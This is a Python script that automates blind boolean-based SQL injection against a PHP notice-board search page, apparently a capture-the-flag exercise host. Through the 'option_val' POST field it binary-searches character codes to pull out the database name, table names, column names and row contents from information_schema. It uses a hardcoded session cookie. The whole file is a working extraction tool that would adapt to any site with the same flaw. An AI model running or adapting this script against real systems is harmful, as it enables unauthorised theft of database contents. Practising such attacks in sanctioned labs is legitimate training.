# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup as bs
from anytree import Node, RenderTree, search
from typing import List

attack_url: str = "http://ctf2.segfaulthub.com:7777/sqli_7/notice_list.php"
user_id: str = "2"
user_pw: str = "2"
option_val: str = "title"

DB = None

def show() -> None:
    global DB

    for pre, fill, node in RenderTree(DB):
        print("%s%s" % (pre, node.name))

def sql_result(sql: str) -> bool:
    datas = {
        "option_val": sql,
        "board_result": "",
        "board_search": "%F0%9F%94%8D",
        "date_from": "",
        "date_to": ""
    }

    cookie = {
        "PHPSESSID": "ljpgngd09l3d7eoia7ob6gdk57"
    }

    response = requests.post(url=attack_url, cookies=cookie, data=datas)

    soup = bs(response.text, 'html.parser')
    check_sum = str(soup.find('tbody'))
    if "존재하지 않습니다." in check_sum:
        return False
    else: return True
    
def counting(query: str) -> int:
    global option_val
    l: int = 0
    r: int = 100

    while (l <= r):
        num: int = (l + r) // 2
        sql: str = f"(({query}) < {str(num)}) and {option_val}"

        if sql_result(sql):
            r = num - 1
        else:
            sql: str = f"(({query}) = {str(num)}) and {option_val}"
            if sql_result(sql):
                return num
            else: l = num + 1
    
    return -1

def char_length(query: str) -> int:
    global option_val
    l: int = 0
    r: int = 100

    while (l <= r):
        num: int = (l + r) // 2
        sql: str = f"((char_length(({query}))) < {num}) and {option_val}"

        if sql_result(sql):
            r = num - 1
        else:
            sql = f"((char_length(({query}))) = {num}) and {option_val}"
            if sql_result(sql):
                return num
            else: l = num + 1

def find_name(query: str, length: int) -> str:
    tmp: List[chr] = []

    for i in range(length):
        l: int = 0
        r: int = 128

        while (l <= r):
            num: int = (l + r) // 2
            sql: str = f"(ascii(substr(({query}), {i + 1}, 1)) < {num}) and {option_val}"

            if sql_result(sql):
                r = num - 1
            else:
                sql = f"(ascii(substr(({query}), {i + 1}, 1)) = {num}) and {option_val}"
                if sql_result(sql):
                    tmp.append(chr(num))
                    break
                else: l = num + 1
    return "".join(tmp)

def find_db() -> None:
    global DB

    print(f"database searching...")
    query = "select database()"
    length = char_length(query)
    name = find_name(query, length)
    DB = Node(name)

def find_table(db_name: str = "") -> None:
    global DB

    print(f"table searching...")

    query: str = f"select count(table_name) from information_schema.tables where table_schema = '{db_name}'"
    cnt = counting(query)

    for j in range(cnt):
        print(f"{j} table searching...")

        query = f"select table_name from information_schema.tables where table_schema = '{db_name}' limit {j}, 1"
        res = char_length(query)
        name = find_name(query, res)
        table = Node(name, parent=DB)

def find_column(table_name: str = "") -> None:
    global DB

    query: str = f"select count(column_name) from information_schema.columns where table_name = '{table_name}'"
    cnt = counting(query)

    parent = search.find(DB, filter_= lambda node: node.name == table_name)

    for k in range(cnt):
        print(f"{k} column searching...")

        query = f"select column_name from information_schema.columns where table_name = '{table_name}' limit {k}, 1"
        length = char_length(query)

        name = find_name(query, length)
        col = Node(name, parent=parent)

def find_data(table_name: str, col_name: str) -> None:
    global DB

    query: str = f"select count({col_name}) from {table_name}"
    cnt = counting(query)

    parent = search.find(DB, filter_= lambda node: node.name == col_name)

    for l in range(cnt):
        print(f"{l} data searching...")
        query = f"select {col_name} from {table_name} limit {l}, 1"
        length = char_length(query)

        name = find_name(query, length)
        data = Node(name, parent=parent)

def main():
    try:
        find_db()
        show()

        db_name = input('db name: ')
        find_table(db_name)
        show()

        table_name = input('table name: ')
        find_column(table_name)
        show()

        col_name = input('column name: ')
        find_data(table_name, col_name)
        show()
    except Exception as e:
        print(type(e))

if __name__ == "__main__":
    main()